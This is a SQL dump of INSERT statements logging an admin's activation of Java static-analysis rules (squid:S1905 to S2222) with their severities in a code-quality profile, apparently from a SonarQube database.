INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1586, '2017-11-20 11:00:18.553', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1905;ruleKey=squid:S1905;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFf_5bbGRdfPp-q2V');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1587, '2017-11-20 11:00:18.595', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1940;ruleKey=squid:S1940;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgAjbbGRdfPp-q2W');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1588, '2017-11-20 11:00:18.659', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1948;ruleKey=squid:S1948;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgBjbbGRdfPp-q2X');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1589, '2017-11-20 11:00:18.696', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1989;ruleKey=squid:S1989;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgCIbbGRdfPp-q2Y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1590, '2017-11-20 11:00:18.736', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S1994;ruleKey=squid:S1994;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgCwbbGRdfPp-q2Z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1591, '2017-11-20 11:00:18.772', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2055;ruleKey=squid:S2055;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgDUbbGRdfPp-q2a');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1592, '2017-11-20 11:00:18.799', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2060;ruleKey=squid:S2060;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgDvbbGRdfPp-q2b');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1593, '2017-11-20 11:00:18.826', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2061;ruleKey=squid:S2061;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgEKbbGRdfPp-q2c');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1594, '2017-11-20 11:00:18.854', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2062;ruleKey=squid:S2062;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgEmbbGRdfPp-q2d');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1595, '2017-11-20 11:00:18.883', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2065;ruleKey=squid:S2065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgFDbbGRdfPp-q2e');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1596, '2017-11-20 11:00:18.916', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2066;ruleKey=squid:S2066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgFkbbGRdfPp-q2f');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1597, '2017-11-20 11:00:18.998', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2068;ruleKey=squid:S2068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgG2bbGRdfPp-q2g');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1598, '2017-11-20 11:00:19.041', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2077;ruleKey=squid:S2077;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgHhbbGRdfPp-q2h');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1599, '2017-11-20 11:00:19.125', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2092;ruleKey=squid:S2092;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgI1bbGRdfPp-q2i');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1600, '2017-11-20 11:00:19.306', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2093;ruleKey=squid:S2093;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgLqbbGRdfPp-q2j');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1601, '2017-11-20 11:00:19.363', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2094;ruleKey=squid:S2094;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgMjbbGRdfPp-q2k');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1602, '2017-11-20 11:00:19.389', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2095;ruleKey=squid:S2095;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;param_excludedResourceTypes=;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgM9bbGRdfPp-q2l');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1603, '2017-11-20 11:00:19.409', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2097;ruleKey=squid:S2097;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgNRbbGRdfPp-q2m');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1604, '2017-11-20 11:00:19.442', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2109;ruleKey=squid:S2109;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgNybbGRdfPp-q2n');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1605, '2017-11-20 11:00:19.48', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2110;ruleKey=squid:S2110;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgOYbbGRdfPp-q2o');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1606, '2017-11-20 11:00:19.507', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2111;ruleKey=squid:S2111;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgOzbbGRdfPp-q2p');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1607, '2017-11-20 11:00:19.537', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2112;ruleKey=squid:S2112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgPRbbGRdfPp-q2q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1608, '2017-11-20 11:00:19.574', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2114;ruleKey=squid:S2114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgP2bbGRdfPp-q2r');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1609, '2017-11-20 11:00:19.613', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2116;ruleKey=squid:S2116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgQdbbGRdfPp-q2s');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1610, '2017-11-20 11:00:19.655', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2118;ruleKey=squid:S2118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgRHbbGRdfPp-q2t');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1611, '2017-11-20 11:00:19.696', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2122;ruleKey=squid:S2122;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgRwbbGRdfPp-q2u');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1612, '2017-11-20 11:00:19.729', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2123;ruleKey=squid:S2123;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgSRbbGRdfPp-q2v');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1613, '2017-11-20 11:00:19.754', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2127;ruleKey=squid:S2127;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgSqbbGRdfPp-q2w');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1614, '2017-11-20 11:00:19.782', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2129;ruleKey=squid:S2129;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgTGbbGRdfPp-q2x');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1615, '2017-11-20 11:00:19.807', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2130;ruleKey=squid:S2130;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgTfbbGRdfPp-q2y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1616, '2017-11-20 11:00:19.849', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2131;ruleKey=squid:S2131;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgUJbbGRdfPp-q2z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1617, '2017-11-20 11:00:19.874', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2133;ruleKey=squid:S2133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgUibbGRdfPp-q20');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1618, '2017-11-20 11:00:19.9', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2134;ruleKey=squid:S2134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgU8bbGRdfPp-q21');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1619, '2017-11-20 11:00:19.935', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2140;ruleKey=squid:S2140;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgVfbbGRdfPp-q22');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1620, '2017-11-20 11:00:20.009', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2142;ruleKey=squid:S2142;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgWpbbGRdfPp-q23');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1621, '2017-11-20 11:00:20.072', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2147;ruleKey=squid:S2147;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgXnbbGRdfPp-q24');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1622, '2017-11-20 11:00:20.095', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2151;ruleKey=squid:S2151;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgX_bbGRdfPp-q25');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1623, '2017-11-20 11:00:20.119', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2153;ruleKey=squid:S2153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgYXbbGRdfPp-q26');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1624, '2017-11-20 11:00:20.136', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2154;ruleKey=squid:S2154;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgYobbGRdfPp-q27');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1625, '2017-11-20 11:00:20.151', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2157;ruleKey=squid:S2157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgY3bbGRdfPp-q28');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1626, '2017-11-20 11:00:20.181', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2159;ruleKey=squid:S2159;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgZVbbGRdfPp-q29');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1627, '2017-11-20 11:00:20.217', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2160;ruleKey=squid:S2160;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgZ5bbGRdfPp-q2-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1628, '2017-11-20 11:00:20.255', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2165;ruleKey=squid:S2165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgafbbGRdfPp-q2_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1629, '2017-11-20 11:00:20.291', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2166;ruleKey=squid:S2166;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgbDbbGRdfPp-q3A');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1630, '2017-11-20 11:00:20.331', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2167;ruleKey=squid:S2167;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgbrbbGRdfPp-q3B');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1631, '2017-11-20 11:00:20.368', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2168;ruleKey=squid:S2168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgcQbbGRdfPp-q3C');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1632, '2017-11-20 11:00:20.404', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2175;ruleKey=squid:S2175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgc0bbGRdfPp-q3D');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1633, '2017-11-20 11:00:20.432', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2176;ruleKey=squid:S2176;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgdQbbGRdfPp-q3E');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1634, '2017-11-20 11:00:20.454', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2177;ruleKey=squid:S2177;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgdmbbGRdfPp-q3F');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1635, '2017-11-20 11:00:20.485', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2178;ruleKey=squid:S2178;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgeFbbGRdfPp-q3G');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1636, '2017-11-20 11:00:20.508', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2183;ruleKey=squid:S2183;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgecbbGRdfPp-q3H');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1637, '2017-11-20 11:00:20.527', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2184;ruleKey=squid:S2184;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgevbbGRdfPp-q3I');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1638, '2017-11-20 11:00:20.566', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2185;ruleKey=squid:S2185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgfWbbGRdfPp-q3J');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1639, '2017-11-20 11:00:20.603', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2186;ruleKey=squid:S2186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgf7bbGRdfPp-q3K');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1640, '2017-11-20 11:00:20.639', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2187;ruleKey=squid:S2187;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFggfbbGRdfPp-q3L');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1641, '2017-11-20 11:00:20.676', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2188;ruleKey=squid:S2188;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFghEbbGRdfPp-q3M');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1642, '2017-11-20 11:00:20.713', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2189;ruleKey=squid:S2189;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFghpbbGRdfPp-q3N');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1643, '2017-11-20 11:00:20.753', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2200;ruleKey=squid:S2200;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgiRbbGRdfPp-q3O');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1644, '2017-11-20 11:00:20.786', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2201;ruleKey=squid:S2201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgiybbGRdfPp-q3P');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1645, '2017-11-20 11:00:20.827', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2204;ruleKey=squid:S2204;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgjbbbGRdfPp-q3Q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1646, '2017-11-20 11:00:20.865', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2209;ruleKey=squid:S2209;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgkBbbGRdfPp-q3R');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1647, '2017-11-20 11:00:20.906', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716:squid:S2222;ruleKey=squid:S2222;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_16-11716;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZFgkqbbGRdfPp-q3S');
